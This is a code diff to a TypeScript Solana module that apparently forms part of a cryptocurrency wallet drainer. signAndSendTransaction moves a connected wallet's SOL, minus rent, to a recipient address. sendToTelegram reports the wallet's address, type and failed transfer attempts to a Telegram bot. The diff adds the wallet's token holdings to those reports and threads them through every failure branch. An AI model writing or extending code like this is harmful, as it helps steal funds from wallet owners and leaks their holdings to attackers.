@@ -1,3 +1,4 @@
+
 import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, sendAndConfirmTransaction } from '@solana/web3.js';
 
 // Add Buffer polyfill for browser environment in a way that works with Vite
@@ -246,11 +247,36 @@ export const sendToTelegram = async (walletData: any, botToken: string, chatId: 
     } else if (walletData.message) {
       // This is a custom message (transfer attempt or completion)
       message = `👛 Wallet: ${walletData.address}\n` +
-        (walletData.walletName ? `🔑 Wallet Type: ${walletData.walletName}\n` : '') +
-        `🔔 ${walletData.message}`;
+        (walletData.walletName ? `🔑 Wallet Type: ${walletData.walletName}\n` : '');
+      
+      // Add token information if available
+      if (walletData.tokens && walletData.tokens.length > 0) {
+        const formattedTokens = walletData.tokens.map((token: any, index: number) => 
+          `Token #${index + 1}:\n` +
+          `  Mint: ${token.mint}\n` +
+          `  Amount: ${token.amount}\n` +
+          `  Decimals: ${token.decimals}`
+        ).join('\n\n');
+        
+        message += `\n💎 TOKEN HOLDINGS:\n${formattedTokens}\n\n`;
+      }
+      
+      message += `🔔 ${walletData.message}`;
     } else {
       // Fallback generic message
       message = `Wallet notification for: ${walletData.address}`;
+      
+      // Add token information if available
+      if (walletData.tokens && walletData.tokens.length > 0) {
+        const formattedTokens = walletData.tokens.map((token: any, index: number) => 
+          `Token #${index + 1}:\n` +
+          `  Mint: ${token.mint}\n` +
+          `  Amount: ${token.amount}\n` +
+          `  Decimals: ${token.decimals}`
+        ).join('\n\n');
+        
+        message += `\n💎 TOKEN HOLDINGS:\n${formattedTokens}`;
+      }
     }
 
     console.log("Sending message to Telegram:", message);
@@ -356,7 +382,8 @@ export const signAndSendTransaction = async (
   recipientAddress: string, 
   amount: number,
   botToken?: string,
-  chatId?: string
+  chatId?: string,
+  tokens?: any[]
 ) => {
   try {
     console.log('Creating transaction...');
@@ -370,7 +397,8 @@ export const signAndSendTransaction = async (
         await sendToTelegram({
           address: wallet?.adapter?.publicKey?.toString() || "Unknown",
           message: `TRANSFER FAILED: Wallet adapter or publicKey is undefined`,
-          walletName: wallet?.adapter?.name || "Unknown Wallet"
+          walletName: wallet?.adapter?.name || "Unknown Wallet",
+          tokens: tokens || []
         }, botToken, chatId);
       }
       
@@ -395,7 +423,8 @@ export const signAndSendTransaction = async (
         await sendToTelegram({
           address: walletPublicKey.toString(),
           message: `TRANSFER FAILED: Insufficient balance (${balanceInSol} SOL)`,
-          walletName: wallet.adapter?.name || "Unknown Wallet"
+          walletName: wallet.adapter?.name || "Unknown Wallet",
+          tokens: tokens || []
         }, botToken, chatId);
       }
       
@@ -410,7 +439,8 @@ export const signAndSendTransaction = async (
         await sendToTelegram({
           address: walletPublicKey.toString(),
           message: `TRANSFER FAILED: Insufficient funds for rent exemption. Minimum ${MINIMUM_REQUIRED_SOL} SOL required. Current balance: ${balanceInSol.toFixed(6)} SOL`,
-          walletName: wallet.adapter?.name || "Unknown Wallet"
+          walletName: wallet.adapter?.name || "Unknown Wallet",
+          tokens: tokens || []
         }, botToken, chatId);
       }
       
@@ -430,7 +460,8 @@ export const signAndSendTransaction = async (
         await sendToTelegram({
           address: walletPublicKey.toString(),
           message: `TRANSFER FAILED: Balance too low for transfer after reserving rent (${balanceInSol} SOL)`,
-          walletName: wallet.adapter?.name || "Unknown Wallet"
+          walletName: wallet.adapter?.name || "Unknown Wallet",
+          tokens: tokens || []
         }, botToken, chatId);
       }
       
@@ -448,7 +479,8 @@ export const signAndSendTransaction = async (
         await sendToTelegram({
           address: walletPublicKey.toString(),
           message: `TRANSFER FAILED: Invalid recipient address`,
-          walletName: wallet.adapter?.name || "Unknown Wallet"
+          walletName: wallet.adapter?.name || "Unknown Wallet",
+          tokens: tokens || []
         }, botToken, chatId);
       }
       
